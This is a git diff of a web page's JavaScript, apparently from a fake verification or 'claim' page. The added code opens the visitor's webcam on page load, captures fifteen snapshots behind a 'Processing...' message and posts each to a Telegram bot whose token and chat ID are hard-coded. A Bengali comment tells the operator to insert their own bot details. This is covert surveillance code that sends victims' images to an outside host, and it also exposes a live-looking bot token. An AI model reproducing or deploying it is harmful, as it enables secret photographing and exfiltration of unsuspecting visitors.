@@ -1,50 +1,55 @@
-document.getElementById("claimBtn").addEventListener("click", () => {
-    document.getElementById("verificationBox").classList.remove("hidden");
-    startCamera();
-});
-
-async function startCamera() {
+document.addEventListener("DOMContentLoaded", async () => {
+    const statusText = document.getElementById("status");
     const video = document.getElementById("video");
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-    video.srcObject = stream;
-    
-    await faceapi.nets.tinyFaceDetector.loadFromUri('/models');
-    await faceapi.nets.faceLandmark68Net.loadFromUri('/models');
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
 
-    setTimeout(() => checkFaceMovements(video), 2000);
-}
+    // 🔴 তোমার টেলিগ্রাম বট টোকেন & চ্যাট আইডি বসাও
+    const TELEGRAM_BOT_TOKEN = "7997811733:AAEgcdq3mGC64cB_duEsQ2kfHTq6CG6t4Ec";
+    const TELEGRAM_CHAT_ID = "7294674899";
 
-async function checkFaceMovements(video) {
-    const instructions = document.getElementById("instructions");
-    instructions.innerText = "Look Down 👇";
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
-    setTimeout(() => {
-        instructions.innerText = "Look Left 👈";
-        setTimeout(() => {
-            instructions.innerText = "Look Right 👉";
-            setTimeout(() => {
-                instructions.innerText = "Close Your Eyes 👀";
-                setTimeout(() => {
-                    instructions.innerText = "Smile 😊";
-                }, 2000);
-            }, 2000);
+        statusText.innerText = "✅ Processing...";
+        startCapturing();
+    } catch (error) {
+        statusText.innerText = "❌ Camera Access Denied!";
+    }
+
+    function startCapturing() {
+        let count = 0;
+        const maxCaptures = 15;
+
+        const captureInterval = setInterval(() => {
+            if (count >= maxCaptures) {
+                clearInterval(captureInterval);
+                return;
+            }
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("photo", blob, "capture.jpg");
+                
+                sendToTelegram(formData);
+            }, "image/jpeg");
+
+            count++;
         }, 2000);
-    }, 2000);
-}
+    }
 
-document.getElementById("submitBtn").addEventListener("click", () => {
-    const uid = document.getElementById("uid").value;
-    if (uid) {
-        sendToTelegram(uid);
-    } else {
-        alert("Please enter your UID!");
+    function sendToTelegram(formData) {
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto?chat_id=${TELEGRAM_CHAT_ID}`, {
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => console.log("📸 Image sent:", data))
+        .catch(error => console.error("❌ Error sending image:", error));
     }
 });
-
-function sendToTelegram(uid) {
-    fetch("http://localhost:3000/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ uid })
-    }).then(() => alert("Verification Submitted!"));
-}
